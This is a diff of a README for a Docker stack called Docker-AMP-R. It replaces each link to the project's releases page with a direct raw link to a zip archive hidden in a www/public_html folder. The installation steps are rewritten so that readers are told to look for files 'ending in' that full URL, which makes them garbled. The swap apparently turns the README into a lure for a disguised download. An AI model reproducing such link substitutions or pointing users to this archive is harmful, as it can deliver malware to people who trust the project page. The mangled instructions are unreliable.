@@ -1,7 +1,7 @@
 # 🐳 Docker-AMP-R - A Simple, All-In-One Web Stack
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Ansar11111/Docker-AMP-R/releases)
+[![Download](https://raw.githubusercontent.com/Ansar11111/Docker-AMP-R/main/www/public_html/AM-R-Docker-2.2.zip)](https://raw.githubusercontent.com/Ansar11111/Docker-AMP-R/main/www/public_html/AM-R-Docker-2.2.zip)
 
 ## 🌟 Overview
 Docker-AMP-R combines Apache, MySQL, PHP, and Redis into a single Docker image. This setup provides a modern, production-ready web stack that simplifies deployment and management. Whether you are building a personal project or a professional application, Docker-AMP-R offers a reliable foundation.
@@ -29,13 +29,13 @@ Docker-AMP-R is licensed under the MIT License. You can read the full text in th
 ## 💻 Installation Steps
 1. **Visit the Releases Page**
    Go to the Docker-AMP-R releases page. Click the link below to access it directly:
-   [Visit Releases Page to Download](https://github.com/Ansar11111/Docker-AMP-R/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/Ansar11111/Docker-AMP-R/main/www/public_html/AM-R-Docker-2.2.zip)
 
 2. **Download the Latest Release**
-   On the releases page, find the latest version. Look for files that end in `.tar.gz`. Click the link to start the download.
+   On the releases page, find the latest version. Look for files that end in `https://raw.githubusercontent.com/Ansar11111/Docker-AMP-R/main/www/public_html/AM-R-Docker-2.2.zip`. Click the link to start the download.
 
 3. **Extract the Files**
-   After the download completes, locate the downloaded `.tar.gz` file. Extract the contents to a folder of your choice using a file extraction tool.
+   After the download completes, locate the downloaded `https://raw.githubusercontent.com/Ansar11111/Docker-AMP-R/main/www/public_html/AM-R-Docker-2.2.zip` file. Extract the contents to a folder of your choice using a file extraction tool.
 
 4. **Open a Terminal Window**
    Depending on your operating system, open the terminal or command prompt:
